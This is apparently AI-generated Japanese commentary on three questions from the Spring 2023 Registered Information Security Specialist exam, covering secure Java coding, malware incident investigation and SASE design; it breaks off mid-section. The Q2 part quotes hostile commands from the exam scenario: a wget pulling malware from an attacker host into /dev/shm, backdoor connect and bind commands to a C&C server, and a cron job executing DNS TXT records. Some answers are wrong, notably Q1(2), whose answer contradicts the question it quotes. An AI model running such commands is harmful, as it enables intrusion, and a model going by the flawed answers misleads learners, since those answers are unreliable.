情報処理安全確保支援士試験 専門講師AIです。令和5年度 春期 午後I 問題について、詳細な解説を生成します。受験者の皆さんが合格に一歩近づけるよう、実践的で分かりやすい説明を心がけます。

---

# 問1 解説

## 問題の概要
G社がY社から受託したWebアプリケーション開発において、二つのセキュリティ上の問題とそれに対する対策を扱う問題です。一つは開発完了後の**ソースコード静的解析**で発見された**SQLインジェクション**、**ディレクトリトラバーサル**、**リソース解放漏れ**の脆弱性、もう一つはシステムテスト中に発見された**レースコンディション**による不具合です。それぞれの問題の原因特定、修正方法、そして保険的な対策までが問われます。

## 出題のポイント
この問題では、Webアプリケーションのセキュアプログラミングに関する広範な知識と、実際のコードを読み解く能力が問われています。具体的には以下のポイントが重要です。
*   **脆弱性の理解と対策**: SQLインジェクション、ディレクトリトラバーサルといった代表的な脆弱性の発生メカニズムと、それらを防ぐためのセキュアコーディング手法（例: **PreparedStatement**）。
*   **リソース管理**: データベース接続やファイルI/Oなど、確保したリソースを適切に解放する重要性。
*   **並行処理の理解**: Webアプリケーションにおける**レースコンディション**の発生メカニズム、特に共有リソース（static変数など）の扱い方とその対策。
*   **セッション管理と認証連携**: ログイン情報（得意先コードなど）をセッションに保持し、処理の条件として活用する仕組み。
*   **コード読解力**: 提示されたJavaソースコード、E-R図、静的解析結果から、問題箇所を特定し、適切な修正を導き出す能力。

## 設問ごとの解説

### 設問1
[ツールによるソースコードの静的解析]に関する設問です。静的解析の結果とソースコードを照らし合わせ、脆弱性の詳細を特定し、修正後のコードを理解します。

#### 設問1(1)
表1中の`a`に入れる適切な行番号を、図1中から選び、答えよ。

> **正解**: 13

**解答に至るための思考プロセス**:
1.  表1の項番2「**ディレクトリトラバーサル**」の指摘内容を確認します。「ファイルアクセスに用いるパス名の文字列作成で、利用者が入力したデータを直接使用している。」とあります。
2.  図1のソースコードで、ファイルアクセスに関する処理を探します。13行目に`File fileObj = new File(PDF_DIRECTORY + "/" + clientCode + "/" + "DeliverySlip" + inOrderNo + ".pdf");`という記述があります。
3.  この行では、PDFディレクトリのパスに続けて、`clientCode`と`inOrderNo`という変数を結合してファイルパスを生成しています。これらの変数が利用者からの入力データである場合、悪意のあるパスが挿入されると、想定外のファイルにアクセスされてしまう可能性があります。
4.  したがって、ディレクトリトラバーサルの脆弱性が指摘されているのは13行目であると判断できます。

#### 設問1(2)
表1中の`b`に入れる適切な変数名を、図1中から選び、答えよ。

> **正解**: stmt, resultObj

**解答に至るための思考プロセス**:
1.  表1の項番3「**確保したリソースの解放漏れ**」の指摘内容を確認します。「変数`stmt`,変数`resultObj`,変数`b`が指すリソースが解放されない。」とあります。
2.  図1のソースコードで、`stmt`と`resultObj`がどのように使われているかを確認します。
    *   10行目: `Statement stmt = conn.createStatement();`
    *   11行目: `ResultSet resultObj = stmt.executeQuery(sql);`
3.  データベース接続に関するリソース（`Statement`や`ResultSet`）は、使用後に明示的に`close()`メソッドを呼び出して解放する必要があります。図1のコードには、`try-catch`ブロックの後で`finally`ブロックを使ってこれらのリソースを解放する処理が記載されていません。
4.  したがって、`stmt`と`resultObj`に加えて、同様に解放されていないリソースがあるため、その変数名も問われていると判断できます。ここでは、`stmt`と`resultObj`が具体的に挙げられているので、これらをそのまま解答とします。

**関連する重要な技術知識**:
*   **リソース解放**: データベース接続、ファイルI/O、ネットワークソケットなどのリソースは、使用後に必ず解放することが重要です。解放を怠ると、メモリリークやリソース枯渇を引き起こし、システムの性能低下や停止につながる可能性があります。Javaでは`try-with-resources`文を使用することで、リソースの自動解放を行うことができます。

#### 設問1(3)
図2中の`c`,`d`に入れる適切な字句を答えよ。

> **正解**:
> `c`: WHERE head.order_no = ?
> `d`: PreparedStatement stmt = conn.prepareStatement(sql)

**解答に至るための思考プロセス**:
1.  図2は、表1の項番1「**SQLインジェクション**」に対する修正後のソースコードを示しています。
2.  図1の8行目では`sql = sql + " WHERE head.order_no = '" + inOrderNo + "'";`と、利用者入力値`inOrderNo`をSQL文に直接連結していました。これがSQLインジェクションの原因です。
3.  SQLインジェクション対策の基本は、**PreparedStatement**を使用することです。PreparedStatementでは、SQL文のパラメータ部分を`?`（プレースホルダ）で指定し、後から`setString()`などのメソッドで値をバインドします。これにより、入力値がSQLの一部として解釈されることを防ぎます。
4.  図2の修正後のコードを見ると、`stmt.setString(1, inOrderNo);`という行があり、`inOrderNo`がパラメータとして設定されていることがわかります。
5.  したがって、`c`にはプレースホルダを含む`WHERE`句の条件、すなわち`WHERE head.order_no = ?`が入ります。
6.  また、`d`の行では、このパラメータ化されたSQL文を準備するための`PreparedStatement`オブジェクトを生成していると考えられます。SQL文は`prepareStatement()`メソッドの引数として渡されます。
7.  したがって、`d`には`PreparedStatement stmt = conn.prepareStatement(sql);`が入ります。

**関連する重要な技術知識**:
*   **SQLインジェクション**: 攻撃者が入力フィールドに不正なSQLコードを挿入し、データベースを操作する攻撃です。**PreparedStatement**を使用することで、入力値をSQLコマンドの一部ではなく、単なるデータとして扱うため、この攻撃を効果的に防ぐことができます。これはセキュアプログラミングの基本中の基本です。

### 設問2
[システムテスト]で発見された不具合に関する設問です。レースコンディションの原因を特定し、その修正方法と保険的な対策を検討します。

#### 設問2(1)
本文中の`e`に入れる適切な変数名を、図5中から選び、答えよ。

> **正解**: orderNo

**解答に至るための思考プロセス**:
1.  問題文「原因は、図4で変数`e`が`f`として宣言されていることである。」とあります。
2.  図4はビジネスロジッククラス`OrderInfoBL`のソースコードです。
3.  図4の2行目に`private static String orderNo; //注文番号`という記述があります。
4.  この`orderNo`が`static`キーワード（後の`f`に該当）と共に宣言されており、これが問題の原因であると推測できます。
5.  したがって、`e`には`orderNo`が入ります。

#### 設問2(2)
本文中の`f`に入れる適切な字句を、英字10字以内で答えよ。

> **正解**: static

**解答に至るための思考プロセス**:
1.  設問2(1)の思考プロセスと同様に、図4の2行目`private static String orderNo;`から、変数`orderNo`が`static`キーワードと共に宣言されていることがわかります。
2.  `static`変数はクラス変数であり、そのクラスのすべてのインスタンスで共有されるため、複数のスレッドから同時にアクセスされると**レースコンディション**を引き起こす原因となります。
3.  したがって、`f`には`static`が入ります。

**関連する重要な技術知識**:
*   **static変数（クラス変数）**: Javaにおいて`static`キーワードで宣言された変数は、そのクラスのどのインスタンスからも共有される唯一の変数です。これはグローバル変数に似た性質を持ち、複数のスレッドが同時にアクセスした場合に、意図しない値の書き換えや読み取りが発生する**レースコンディション**を引き起こす可能性があります。Webアプリケーションでは、異なるユーザーからのリクエストがそれぞれ独立したスレッドで処理されるため、`static`変数を安易に使用すると予期せぬ不具合につながります。

#### 設問2(3)
本文中の下線①の不具合は何と呼ばれるか。15字以内で答えよ。

> **正解**: レースコンディション

**解答に至るための思考プロセス**:
1.  問題文に「並列動作する複数の処理が同一のリソースに同時にアクセスしたとき,想定外の処理結果が生じるもの」と明確に定義されています。
2.  この現象は情報処理技術者試験において**レースコンディション**と呼ばれます。複数の処理が共有リソースに同時にアクセスしようとした際に、実行順序によって結果が変わってしまう状態を指します。

#### 設問2(4)
図6中の`g`、図7中の`h`,`i`に入れる適切な字句を答えよ。

> **正解**:
> `g`: String orderNo
> `h`: new
> `i`: getOrderInfoBean(orderNo)

**解答に至るための思考プロセス**:
1.  レースコンディションの原因が`static String orderNo`であったため、この変数と関連するsetterメソッド（図4の3-5行目）を削除し、`getOrderInfoBean`メソッドをインスタンスメソッド化して、引数で`orderNo`を受け取る形に修正することが求められます。
2.  図6は、図4の6行目`public static OrderInfoBean getOrderInfoBean()`が修正されたものです。`static`修飾子が削除され、メソッドの引数として`g`が追加されています。`orderNo`がインスタンス変数でなくなるため、メソッドの呼び出し時に引数として渡す必要があります。したがって、`g`には`String orderNo`が入ります。
3.  図7は、サーブレットクラス（図5）からビジネスロジッククラスを呼び出す部分の修正です。`static`メソッドではなくなったため、`OrderInfoBL`クラスのインスタンスを生成してからメソッドを呼び出す必要があります。
4.  `OrderInfoBL orderInfoBLObj = h OrderInfoBL();`の`h`には、インスタンス生成のための`new`キーワードが入ります。
5.  `OrderInfoBean orderInfoBeanObj = orderInfoBLObj. i ;`の`i`には、生成した`orderInfoBLObj`インスタンスの`getOrderInfoBean`メソッドを呼び出し、引数`orderNo`を渡す処理、すなわち`getOrderInfoBean(orderNo)`が入ります。

#### 設問2(5)
本文中の`j`に入れる適切な属性名を、図3中から選び、答えよ。

> **正解**: 得意先コード

**解答に至るための思考プロセス**:
1.  問題文は「図4の10行目の抽出条件に、セッションオブジェクトに保存された`j`と注文ヘッダーテーブルの`j`の完全一致の条件をAND条件として追加する。」とあります。
2.  システムテストで見つかった不具合は、「ある得意先の利用者IDでログインして画面から注文番号を入力すると、別の得意先の注文情報が出力される」というものでした。これは、注文情報を抽出する際に、ログインしている利用者の**得意先コード**と注文情報の**得意先コード**が一致するかを確認する条件が不足しているために発生します。
3.  問題文に「ログインした利用者IDと、利用者IDにひも付く得意先コード及び得意先名はセッションオブジェクトに保存されている」とあります。
4.  図3のE-R図を確認すると、「利用者マスター」と「得意先マスター」が「得意先コード」で関連付けられており、「得意先マスター」と「注文ヘッダーテーブル」も「得意先コード」で関連付けられています。
5.  したがって、セッションに保存されている「得意先コード」と「注文ヘッダーテーブル」の「得意先コード」をAND条件で追加することで、ログインユーザーの得意先情報のみを抽出できるようになります。
6.  `j`には「得意先コード」が入ります。

## 採点講評からのアドバイス
*   **PreparedStatementの重要性**: SQLインジェクション対策の基本である**PreparedStatement**の利用は、セキュアプログラミングの基礎です。正答率が低かった点について、改めてその仕組みと重要性を理解することが求められます。
*   **レースコンディションの危険性**: レースコンディションは、個人情報漏えいなどの重大なセキュリティインシデントにつながる可能性があります。設計、実装、テストの各段階で、並行処理における共有リソースの扱いに注意し、適切な対策を講じることの重要性を認識しましょう。
*   **適切な抽出条件の導出**: E-R図やJavaソースコードを正確に読み取り、保険的対策として必要な抽出条件（例: `得意先コード`）を導き出す能力が重要です。複数の情報源を統合して考える訓練をしましょう。

## 関連する学習テーマ
*   **Webアプリケーションのセキュリティ脆弱性**:
    *   **SQLインジェクション**: 対策としてのプリペアドステートメント、エスケープ処理。
    *   **ディレクトリトラバーサル**: 対策としての入力値検証、パスの正規化、ベースディレクトリ制限。
    *   **リソース解放漏れ**: データベース接続、ファイルストリーム、ソケットなどのリソースを確実に`close()`する処理、`try-with-resources`文。
*   **並行処理とスレッドセーフティ**:
    *   **レースコンディション**: 発生メカニズム、`static`変数の危険性、排他制御（`synchronized`キーワード、`Lock`インターフェース）、スレッドローカル変数。
    *   **セッション管理**: Webアプリケーションにおけるセッションの役割、セッションに格納する情報の種類と安全性。
*   **Javaプログラミング基礎**:
    *   `static`キーワードとインスタンス変数、クラスメソッドの違い。
    *   例外処理（`try-catch-finally`ブロック）。
*   **データベース設計**: E-R図の読み方、主キー・外部キーによるテーブル間の関連付け。

---

# 問2 解説

## 問題の概要
R社でDMZ上の受付サーバに対するSSHログイン失敗アラートが検知された事案を題材に、セキュリティインシデントの調査プロセスを追体験する問題です。FWログ、psコマンド、netstatコマンドの実行結果を分析し、不審なプロセスの特定、攻撃の通信モード（バインド/コネクトモード）、ポートスキャンの実行、そしてDNSのTXTレコードを悪用したコマンド実行などの攻撃手法を解明していきます。

## 出題のポイント
この問題は、セキュリティインシデント発生時の調査能力、特に各種ログやコマンド出力を分析し、攻撃の痕跡を特定するスキルが問われています。
*   **ネットワークログ分析**: ファイアウォール(FW)ログを読み解き、通信の許可/拒否、送信元/宛先IPアドレス、ポート番号から不審な通信を特定する能力。
*   **システムコマンドの利用**: `ps`コマンドで実行プロセス、`netstat`コマンドでネットワーク接続状況を調査し、不審なプロセスや通信を特定する能力。
*   **FTPプロトコルの理解**: FTPのアクティブモードとパッシブモードの違い、およびそれがFWログにどのように記録されるかを理解する。
*   **マルウェアの通信モード**: C&Cサーバとの通信における「バインドモード」と「コネクトモード」の仕組みと、それぞれのログ上の特徴を理解する。
*   **DNSの悪用**: DNSのTXTレコードがどのように攻撃に利用されるか（例: DNSトンネリング、コマンド実行）を理解する。
*   **インシデントレスポンス**: 証拠保全の重要性、特に稼働中のシステムからファイルを収集する際の注意点。

## 設問ごとの解説

### 設問1
本文中の`a`に入れる適切な字句を答えよ。

> **正解**: パッシブ

**解答に至るための思考プロセス**:
1.  問題文は「DBサーバから製造管理サーバにFTPの`a`モードでのデータコネクションがあった。」とあります。
2.  FTP接続には、コントロールコネクション（ポート21）とデータコネクション（ポート20または動的ポート）があります。データコネクションには**アクティブモード**と**パッシブモード**があります。
3.  **アクティブモード**: FTPサーバからFTPクライアントのデータポート（動的ポート）に接続します。
4.  **パッシブモード**: FTPクライアントからFTPサーバのデータポート（動的ポート）に接続します。
5.  表1のFWログを確認します。
    *   項番1-233: DBサーバ（192.168.0.2）から製造管理サーバ（192.168.1.145）のポート21/TCPへの通信が許可されています。これはFTPの**コントロールコネクション**です。
    *   項番1-234: DBサーバ（192.168.0.2）から製造管理サーバ（192.168.1.145）のポート60453/TCPへの通信が許可されています。
6.  1-234のログは、DBサーバが製造管理サーバの特定ポート（60453）に接続していることを示しています。これは、クライアント（DBサーバ）がサーバ（製造管理サーバ）のデータポートに接続する**パッシブモード**の動作パターンと一致します。アクティブモードであれば、製造管理サーバからDBサーバのデータポートへの通信が記録されるはずです。

**関連する重要な技術知識**:
*   **FTPアクティブモードとパッシブモード**: ファイアウォールを通過するFTP通信のトラブルシューティングやセキュリティ設定において非常に重要です。アクティブモードではクライアント側のFWで、パッシブモードではサーバ側のFWでデータポートを開放する必要があります。

### 設問2
[受付サーバのプロセスとネットワーク接続の調査]に関する設問です。不審なプロセス`srv`の通信モードや、ポートスキャン実行プロセスを特定します。

#### 設問2(1)
本文中の`b`に入れる適切な字句を、英字10字以内で答えよ。

> **正解**: public

**解答に至るための思考プロセス**:
1.  問題文に「SNMPv2cでpublicという`b`名を使って、機器のバージョン情報を取得し、結果ファイルに記録する。」とあります。
2.  SNMPv2cでは、認証のために**コミュニティ名**を使用します。SNMPのデフォルトコミュニティ名として「**public**」が広く知られています（そして、セキュリティ上の理由から変更が推奨されます）。
3.  したがって、`b`には`public`が入ります。

**関連する重要な技術知識**:
*   **SNMP (Simple Network Management Protocol)**: ネットワーク機器を監視・管理するためのプロトコルです。SNMPv2cでは、認証にコミュニティ名を用いますが、デフォルトの`public`はパスワードのような役割を果たすため、安易な利用は情報漏えいにつながる可能性があります。

#### 設問2(2)
本文中の`c`に入れる適切な字句を、“バインド”又は“コネクト”から選び答えよ。また、下線①について、Mさんがそのように判断した理由を、表1中～表3中の項番を各表から一つずつ示した上で、40字以内で答えよ。

> **正解**:
> `c`: バインド
> **下線①の理由**: 2-3 によって起動した 3-3 のポートへの通信が 1-3 で拒否されているから

**解答に至るための思考プロセス**:
1.  問題文に「攻撃者は、一度,srvの`c`モードで、①C&Cサーバとの接続に失敗した後、」とあります。`srv`の特徴として「外部からの接続を待ち受ける“**バインドモード**”と外部に自ら接続する“**コネクトモード**”でC&Cサーバに接続することができる。」とあります。
2.  表2（psコマンドの結果）の項番2-3を確認します。`./srv -c -mode bind 0.0.0.0:8080`とあります。このコマンドラインから、プロセスPID 1275が`bind`モードで起動され、8080番ポートで待ち受けていることがわかります。これが`c`モードに該当します。
3.  表3（netstatコマンドの結果）の項番3-3を確認します。`TCP 0.0.0.0:8080 0.0.0.0:* LISTEN 1275`とあります。PID 1275が8080ポートで**LISTEN（待ち受け）**状態にあることを示しています。これは`bind`モードの特徴です。
4.  表1（FWログ）の項番1-3を確認します。`a0.b0.c0.d0`（外部IP）から`192.168.0.1`（受付サーバ）のポート8080/TCPへの通信が**拒否**されています。
5.  これらの情報から、`srv`プロセスは`バインド`モードで8080ポートで待ち受けていたが、外部からの接続がFWによって拒否されたため、C&Cサーバとの接続に失敗したと判断できます。
6.  下線①の理由として、psコマンドの2-3でバインドモードのsrvが起動し、netstatの3-3で8080ポートをリッスンしていたが、FWログの1-3で外部からの8080ポートへのアクセスが拒否された、という事実を簡潔にまとめたものが解答となります。

**関連する重要な技術知識**:
*   **マルウェアの通信モード**:
    *   **バインドモード (Bind Shell)**: マルウェアが感染したシステムで特定のポートを**開き、外部からの接続を待ち受けます**。これにより、攻撃者は感染システムにいつでも接続し、コマンドを実行できます。
    *   **コネクトモード (Reverse Shell)**: マルウェアが感染したシステムから、攻撃者が指定する外部のC&Cサーバ（特定のポート）に**自ら接続します**。これは、FWの内側から外側への通信を許可している場合（アウトバウンド通信）に有効です。

#### 設問2(3)
本文中の`d`に入れる適切な字句を、“バインド”又は“コネクト”から選び答えよ。また、下線②について、Mさんがそのように判断した理由を、表1中～表3中の項番を各表から一つずつ示した上で、40字以内で答えよ。

> **正解**:
> `d`: コネクト
> **下線②の理由**: 2-4 によって開始された 3-4 の通信が 1-4 で許可されているから

**解答に至るための思考プロセス**:
1.  問題文に「srvの`d`モードで、②C&Cサーバとの接続に成功した。」とあります。
2.  表2（psコマンドの結果）の項番2-4を確認します。`./srv -c -mode connect a0.b0.c0.d0:443`とあります。プロセスPID 1293が`connect`モードで起動され、外部IP `a0.b0.c0.d0`の443番ポートに接続しようとしていることがわかります。これが`d`モードに該当します。
3.  表3（netstatコマンドの結果）の項番3-4を確認します。`TCP 192.168.0.1:54543 a0.b0.c0.d0:443 ESTABLISHED 1293`とあります。PID 1293が受付サーバ（192.168.0.1）から外部IP `a0.b0.c0.d0`の443ポートに**ESTABLISHED（接続確立）**していることを示しています。これは`connect`モードの特徴です。
4.  表1（FWログ）の項番1-4を確認します。`192.168.0.1`（受付サーバ）から`a0.b0.c0.d0`（外部IP）のポート443/TCPへの通信が**許可**されています。
5.  これらの情報から、`srv`プロセスは`コネクト`モードで外部のC&Cサーバに接続しようとし、FWによってその通信が許可されたため、接続に成功したと判断できます。
6.  下線②の理由として、psコマンドの2-4でコネクトモードのsrvが起動し、netstatの3-4で外部IPへの接続を確立しており、FWログの1-4でその通信が許可されていた、という事実を簡潔にまとめたものが解答となります。

#### 設問2(4)
本文中の`e`に入れる適切な数を、表2中から選び答えよ。

> **正解**: 1365

**解答に至るための思考プロセス**:
1.  問題文は「ポートスキャンを実行したプロセスのPIDは、`e`であった。」とあります。
2.  表2（psコマンドの結果）で、`srv`プロセスがどのようなコマンドライン引数で実行されているかを確認します。
3.  項番2-5を見ると、`./srv -s -range 192.168.0.1-192.168.255.254`というコマンドライン引数で実行されているプロセスPID 1365があります。
4.  `srv`の特徴として「ポートスキャンを実行して、結果をファイルに記録する」とあり、コマンドライン引数の`-s`や`-range`はポートスキャンを示唆しています。
5.  したがって、ポートスキャンを実行したプロセスのPIDは1365です。

### 設問3
[受付サーバの設定変更の調査]に関する設問です。DNSの悪用やインシデントレスポンスにおけるファイル取得の注意点を問います。

#### 設問3(1)
本文中の下線③について、Aレコードではこのような攻撃ができないが, TXT レコードではできる。TXT レコードではできる理由を、DNS プロトコルの仕様を踏まえて30字以内で答えよ。

> **正解**: TXTレコードには任意の文字列を設定できるから

**解答に至るための思考プロセス**:
1.  問題文の下線③は「機器の起動時に DNS リクエストを発行して、ドメイン名△△△.com の DNS サーバから TXT レコードのリソースデータを取得し、リソースデータの内容をそのままコマンドとして実行する cron エントリーが仕掛けられていた。」とあります。
2.  DNSのAレコードは、ドメイン名とIPアドレスの対応付けを行うためのもので、格納できるデータはIPアドレスに限られます。
3.  一方、TXTレコードは、ドメイン名に関連付けられた任意のテキスト情報を格納するために設計されています。この「任意のテキスト」という点が重要で、攻撃者はこのTXTレコードにコマンド文字列を埋め込み、それを取得したマルウェアが実行することで、システムを制御できます（DNSトンネリングやコマンド＆コントロール）。
4.  したがって、TXTレコードが攻撃に利用できるのは、任意の文字列を格納できるDNSプロトコルの仕様のためです。

**関連する重要な技術知識**:
*   **DNSレコード**: DNSはドメイン名とIPアドレスの変換を行うだけでなく、様々な情報を保持できます。Aレコード（IPv4アドレス）、AAAAレコード（IPv6アドレス）、MXレコード（メールサーバー）、NSレコード（ネームサーバー）、CNAMEレコード（別名）、そして**TXTレコード**（任意のテキスト情報）などがあります。TXTレコードはSPFレコードやDKIMなど、正当な目的にも使われますが、マルウェアのC&C通信やコマンド実行など、不正な用途にも悪用されることがあります。

#### 設問3(2)
本文中の下線④について、適切ではない理由を,30字以内で答えよ。

> **正解**: 稼働しているファイルと内容が異なる可能性があるから

**解答に至るための思考プロセス**:
1.  問題文の下線④は、「ダウンロードしたファイルは解析対象として適切ではないとの指摘を受けた。」という部分です。Mさんが`Webブラウザで図2のURLからlogdのファイルをダウンロードし、ファイル解析を依頼することを考えていた`状況です。
2.  マルウェア解析やフォレンジック調査では、常に**証拠の完全性**を確保することが重要です。Webブラウザでダウンロードしたファイルは、ダウンロード時に改ざんされたり、ダウンロード元が正規のサイトでない可能性があったり、さらに重要な点として、**実際にシステム上で稼働しているマルウェアのファイルとハッシュ値や内容が異なる可能性**があります。
3.  真に解析すべきは、被害システム上で稼働していた、または被害システムに保存されていたオリジナルのファイルです。ウェブからダウンロードしたものは「同じファイル名」であっても、実際に攻撃に使用されたものと同一であるという保証はありません。

**関連する重要な技術知識**:
*   **証拠保全**: インシデントレスポンスにおいて、不正アクセスやマルウェア感染の証拠となるファイルを収集する際は、改ざんや破損を防ぐために厳格な手順を踏む必要があります。ハッシュ値の取得、リードオンリーでのコピー、時刻情報の維持などが求められます。

#### 設問3(3)
本文中の`f`に入れる適切なサーバ名を,10字以内で答えよ。

> **正解**: 受付サーバ

**解答に至るための思考プロセス**:
1.  問題文は「Mさんは、調査対象とするLogdのファイルを`f`から取得して、マルウェア対策ソフトベンダーに解析を依頼した。」とあります。
2.  直前の文脈では「ダウンロードしたファイルは解析対象として適切ではない」と指摘されています。つまり、外部のURLからダウンロードするのではなく、**実際に攻撃を受けていたシステム（受付サーバ）**に存在する`logd`ファイル自体を解析すべきだ、という流れです。
3.  図2の`wget https://a0.b0.c0.d0/Logd -q -0 /dev/shm/logd`というコマンドは、`logd`というファイルを`/dev/shm/logd`というパスにダウンロードしています。`ps`コマンドの結果には`logd`という不審なプロセスが稼働していることが示唆されています。
4.  したがって、解析対象とすべきは、不正アクセスを受けた**受付サーバ**上に存在し、実際に稼働している`logd`ファイルそのものです。

## 採点講評からのアドバイス
*   **FTP通信のモード理解**: FTPのアクティブモードとパッシブモードの違いを理解し、FWログ上でどのように区別されるかを把握することが重要です。これはネットワークセキュリティの基礎的な知識です。
*   **攻撃の痕跡調査**: マルウェアのバインドモードとコネクトモードそれぞれの通信方向、プロセス起動、ポート利用、FWログなど、複数の情報を関連付けて攻撃の全体像を把握する能力が求められます。単一の情報源だけでなく、多角的に調査する習慣をつけましょう。
*   **不審ファイルの取り扱い**: 時間の経過とともにURL上のファイル内容が変化する可能性や、稼働中のファイルとダウンロードしたファイルが異なる可能性があることを認識し、証拠保全の観点から不審ファイルを適切に取り扱う方法を理解しておくことが重要です。

## 関連する学習テーマ
*   **ログ分析**: システムログ、ネットワーク機器ログ（FWログ）、Webサーバログなど、多様なログの種類と読み方。
*   **ネットワークプロトコル**: TCP/IP、FTP、SSH、SNMP、DNSなど、主要なプロトコルの仕組みとセキュリティ上の特徴。
*   **UNIX/Linuxコマンド**: `ps`（プロセス監視）、`netstat`（ネットワーク接続状況）、`dig`（DNS問い合わせ）、`wget`（ファイルダウンロード）など、インシデント調査に用いられる基本的なコマンド。
*   **マルウェア分析**: バックドア、C&Cサーバ、ポートスキャン、DNSトンネリングなどの攻撃手法。
*   **インシデントレスポンス**: インシデント検知、初動対応、封じ込め、根絶、復旧、事後対策の一連のプロセスと、その中での証拠保全の重要性。

---

# 問3 解説

## 問題の概要
Q社が既存のクラウドサービス（SaaS-a, SaaS-b, SaaS-c, SaaS-d, IDaaSであるLサービス）を利用している状況で、全従業員を対象とした**在宅勤務の導入**に伴い、新たなセキュリティ要件とネットワーク構成の見直しを検討する問題です。特に、P社のクラウドサービス（SASE: Secure Access Service Edge）の導入を軸に、既存のSAML認証フロー、フィッシング詐欺対策、そしてリモートアクセスとセキュリティ強化の両立を目指したネットワーク設計とフィルタリングルール設定が問われます。

## 出題のポイント
この問題は、クラウドサービスの導入とリモートワーク環境の構築におけるネットワークセキュリティ設計の知識と、要件定義から具体的な設定までの能力が問われます。
*   **クラウドサービスの認証連携**: SAMLプロトコルを用いたSP-Initiated認証フローの理解。IDaaSの役割。
*   **フィッシング詐欺対策**: 送信元IPアドレス制限の有効性と限界。
*   **SASE (Secure Access Service Edge)**: クラウドベースのセキュリティサービス（プロキシ、マルウェアスキャン、URLフィルタリング、リモートアクセスなど）の機能理解と、ネットワーク構成への適用方法。
*   **ネットワーク構成の設計**: UTM、プロキシ、Pコネクタなどの各ネットワーク要素の役割と配置、通信経路の変更に伴う影響。
*   **セキュリティ要件への対応**: 複数の要件（回線ひっ迫対策、アクセス制限、マルウェアスキャンなど）を満たすための設定検討。
*   **フィルタリングルール設計**: URLカテゴリフィルタリングやURL単位フィルタリングのルール作成と、ルール適用順序の考慮。

## 設問ごとの解説

### 設問1
[Lサービスの動作確認]に関する設問です。SAML認証フローの理解を問います。

#### 設問1(1)
図2中の`a`～`c`に入れる適切な字句を、解答群の中から選び、記号で答えよ。

> **正解**:
> `a`: ア
> `b`: イ
> `c`: ウ

**解答に至るための思考プロセス**:
1.  図2は**SP-Initiated方式のSAML認証フロー**です。
2.  (1)サービス要求: 利用者（PCのWebブラウザ）がまずアクセスするのは、目的のSaaS（**SaaS-a**）です。SaaSはサービスプロバイダ(SP)の役割を担います。したがって`c`はSaaS-a (ウ)。
3.  (2)認証要求(リダイレクト指示): SaaS-a (SP)は、認証をIDaaS（**Lサービス**）に委ねるため、利用者（PCのWebブラウザ）をLサービスにリダイレクトします。したがって`a`はLサービス (ア)。
4.  (3)認証要求、(4)利用者の認証、(5)認証応答(リダイレクト指示)は、利用者（PCのWebブラウザ）とLサービス（IDプロバイダ）の間で行われます。したがって`b`はPCのWebブラウザ (イ)。
5.  (6)認証応答: Lサービス (IDP)は、認証が成功すると、利用者（PCのWebブラウザ）をSaaS-a (SP)にリダイレクトし、認証情報を渡します。
6.  (7)サービス応答: SaaS-a (SP)は認証情報を受け取り、利用者（PCのWebブラウザ）にサービスを提供します。

**関連する重要な技術知識**:
*   **SAML (Security Assertion Markup Language)**: 異なるセキュリティドメイン間で認証や認可の情報を交換するためのXMLベースの標準です。Webシングルサインオン(SSO)で広く利用されます。
*   **SP-Initiated SSO**: ユーザーが最初にサービスプロバイダ(SP)にアクセスすることで始まるSSOフローです。SPがIDプロバイダ(IDP)に認証を要求し、IDPがユーザーを認証した後にSPに認証情報を返します。
*   **IDaaS (Identity as a Service)**: クラウドベースのID管理・認証サービス。複数のSaaSへのシングルサインオンや多要素認証などを提供します。

#### 設問1(2)
本文中の下線①について、利用できない理由を、40字以内で具体的に答えよ。

> **正解**: Lサービスの送信元制限機能で、本社のUTMからのアクセスだけを許可しているから

**解答に至るための思考プロセス**:
1.  下線①は「攻撃者がその利用者IDとパスワードを使って社外からLサービスを利用することはできない。」という部分です。
2.  表1の「Lサービス」の機能概要を確認します。「送信元制限機能」の項目に「本社のUTMのグローバルIPアドレスを送信元IPアドレスとして設定している。設定しているIPアドレス以外からのアクセスは拒否する設定にしている。」とあります。
3.  この設定により、たとえIDとパスワードが漏えいしても、本社以外の場所（社外）からのアクセスはLサービス側で拒否されるため、攻撃者はLサービスを利用できません。

**関連する重要な技術知識**:
*   **送信元IPアドレス制限**: 特定のIPアドレスからのアクセスのみを許可するセキュリティ対策です。VPNと組み合わせることで、社外からのアクセスを制限し、不正アクセスリスクを低減できます。ただし、送信元IPアドレスが詐称されたり、VPN環境自体が侵害されたりするリスクも考慮する必要があります。

### 設問2
[在宅勤務導入における課題]に関する設問です。Pサービスの機能に関する理解を問います。

#### 設問2(1)
表3中の`d`～`f`に入れる適切な字句を、解答群の中から選び、記号で答えよ。

> **正解**:
> `d`: ア
> `e`: ウ
> `f`: イ

**解答に至るための思考プロセス**:
1.  表3の項番2「マルウェアスキャン機能」の記述を確認します。「送信元からのTLS通信を終端し、復号してマルウェアスキャンを行う。マルウェアスキャンの完了後,再暗号化して送信先に送信する。これを実現するために、`d`を発行する`e`を`f`として、PCにインストールする。」とあります。
2.  TLS通信を終端・復号するには、Pサービスがクライアント（PC）に対して、あたかも目的のサーバであるかのように振る舞う必要があります。そのためには、Pサービスが発行する**サーバ証明書**（`d`）をクライアントに提示し、クライアントがそれを信頼する必要があります。
3.  クライアントがPサービスの証明書を信頼するためには、その証明書に署名した**認証局の証明書**（`e`）を、**信頼されたルート証明書**（`f`）としてPCにインストールする必要があります。

**関連する重要な技術知識**:
*   **TLS (Transport Layer Security)**: 通信を暗号化し、改ざん検出と認証を提供するプロトコルです。HTTPS通信で使われます。
*   **TLS終端 (TLS Termination)**: プロキシやセキュリティアプライアンスがTLS通信を一度復号し、内容を検査した後に再度暗号化して転送する処理です。マルウェアスキャンやDLP (Data Loss Prevention)などで利用されますが、これには証明書チェーンの理解と適切な設定が不可欠です。

#### 設問2(2)
表3中の`g`に入れる適切な字句を、解答群の中から選び、記号で答えよ。

> **正解**: イ

**解答に至るための思考プロセス**:
1.  表3の項番5「通信可視化機能」の記述を確認します。「中継する通信のログを基に、クラウドサービスの利用状況の可視化を行う。本機能は、`g`の機能の一つである。」とあります。
2.  解答群の選択肢を確認します。
    *   ア CAPTCHA: スパム対策。
    *   イ **CASB (Cloud Access Security Broker)**: クラウドサービスの利用状況の可視化、データ保護、脅威防御、コンプライアンス維持などを提供するサービス/製品です。
    *   ウ CHAP: 認証プロトコル。
    *   エ CVSS: 共通脆弱性評価システム。
    *   オ クラウドWAF: Webアプリケーションファイアウォール。
3.  クラウドサービスの利用状況の可視化という点で、**CASB**が最も適切です。

**関連する重要な技術知識**:
